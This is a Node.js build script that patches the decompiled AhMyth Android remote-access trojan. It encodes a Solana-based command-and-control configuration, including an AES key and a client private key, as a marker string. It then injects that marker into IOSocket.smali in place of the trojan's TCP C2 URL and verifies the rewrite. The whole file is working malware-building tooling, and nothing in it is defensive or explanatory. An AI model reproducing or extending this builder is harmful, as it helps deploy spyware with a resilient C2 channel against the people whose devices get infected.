const fs = require('fs');
const path = require('path');

// Read blockchain config from JSON file or environment variables
let config;
const configPath = path.join(__dirname, 'blockchain-build-config.json');
if (fs.existsSync(configPath)) {
    console.log('[Config] Reading from blockchain-build-config.json');
    config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
} else {
    console.log('[Config] Reading from environment variables');
    config = {
        type: 'blockchain',
        rpcUrl: process.env.BLOCKCHAIN_RPC_URL || process.env.SOLANA_RPC_URL || 'https://api.devnet.solana.com',
        contractAddress: process.env.BLOCKCHAIN_CONTRACT_ADDRESS,
        aesKey: process.env.BLOCKCHAIN_C2_AES_KEY,
        clientPrivateKey: process.env.BLOCKCHAIN_CLIENT_PRIVATE_KEY,
        chain: 'solana'
    };
}

// Normalize config keys first
if (config.contract && !config.contractAddress) config.contractAddress = config.contract;
if (config.clientKey && !config.clientPrivateKey) config.clientPrivateKey = config.clientKey;

// Validate config after normalization
if (!config.contractAddress) {
    console.error('[Error] Missing contractAddress/contract');
    process.exit(1);
}
if (!config.aesKey) {
    console.error('[Error] Missing aesKey');
    process.exit(1);
}
if (!config.clientPrivateKey) {
    console.error('[Error] Missing clientPrivateKey/clientKey');
    process.exit(1);
}

// Create final config
const finalConfig = {
    type: 'blockchain',
    rpcUrl: config.rpcUrl,
    contractAddress: config.contractAddress,
    aesKey: config.aesKey,
    clientPrivateKey: config.clientPrivateKey,
    chain: config.chain || 'solana'
};

const marker = 'BLOCKCHAIN_C2_CONFIG:' + Buffer.from(JSON.stringify(finalConfig)).toString('base64');
console.log('Marker length:', marker.length);
console.log('Marker:', marker.substring(0, 60) + '...');

// Read IOSocket.smali - check multiple possible locations
console.log('[IOSocket] Searching for IOSocket.smali...');
const possiblePaths = [
    'Ahmyth/smali/ahmyth/mine/king/ahmyth/IOSocket.smali',
    'Ahmyth/smali_classes2/ahmyth/mine/king/ahmyth/IOSocket.smali',
    'Ahmyth/smali_classes3/ahmyth/mine/king/ahmyth/IOSocket.smali',
    'Ahmyth_blockchain/smali_classes3/ahmyth/mine/king/ahmyth/IOSocket.smali',
    'Ahmyth_fresh_dec/smali_classes3/ahmyth/mine/king/ahmyth/IOSocket.smali'
];

let ioPath = null;
for (const p of possiblePaths) {
    if (fs.existsSync(path.join(__dirname, p))) {
        ioPath = path.join(__dirname, p);
        break;
    }
}

if (!ioPath) {
    console.error('[Error] IOSocket.smali not found in any location');
    console.error('[Searched]', possiblePaths);
    process.exit(1);
}
console.log('[IOSocket] Found at:', path.relative(__dirname, ioPath));
let content = fs.readFileSync(ioPath, 'utf8');
console.log('IOSocket size:', content.length, 'bytes');

// Find and replace blockchain config marker
let replaced = false;
console.log('[Replace] Looking for BLOCKCHAIN_C2_CONFIG marker...');

// Pattern 1: Look for existing BLOCKCHAIN_C2_CONFIG: marker
const blockchainPattern = /const-string (v\d+), "BLOCKCHAIN_C2_CONFIG:[^"]*"/g;
const blockchainMatches = content.match(blockchainPattern);
if (blockchainMatches && blockchainMatches.length > 0) {
    console.log(`[Replace] Found ${blockchainMatches.length} BLOCKCHAIN_C2_CONFIG marker(s)`);
    content = content.replace(blockchainPattern, (match, reg) => {
        replaced = true;
        return `const-string ${reg}, "${marker}"`;
    });
    console.log('[Replace] Replaced existing blockchain config');
} else {
    // Pattern 2: Look for TCP URL pattern and replace with blockchain marker
    const urlPattern = /const-string (v\d+), "http:\/\/[0-9.]+:[0-9]+"/g;
    const urlMatches = content.match(urlPattern);
    if (urlMatches && urlMatches.length > 0) {
        console.log(`[Replace] Found ${urlMatches.length} TCP URL pattern(s), replacing with blockchain config`);
        content = content.replace(urlPattern, (match, reg) => {
            replaced = true;
            return `const-string ${reg}, "${marker}"`;
        });
    } else {
        console.log('[Replace] No suitable pattern found for injection');
    }
}

if (replaced) {
    fs.writeFileSync(ioPath, content);
    console.log('[Success] Blockchain config injected!');

    // Verify
    const verify = fs.readFileSync(ioPath, 'utf8');
    if (verify.includes(marker.substring(0, 40))) {
        console.log('[Verified] New config found in file');
    } else {
        console.error('[Error] Verification failed - config not found in file');
        process.exit(1);
    }
} else {
    console.error('[Error] Could not find injection point in IOSocket.smali');
    console.error('[Hint] File may have unexpected format');
    process.exit(1);
}

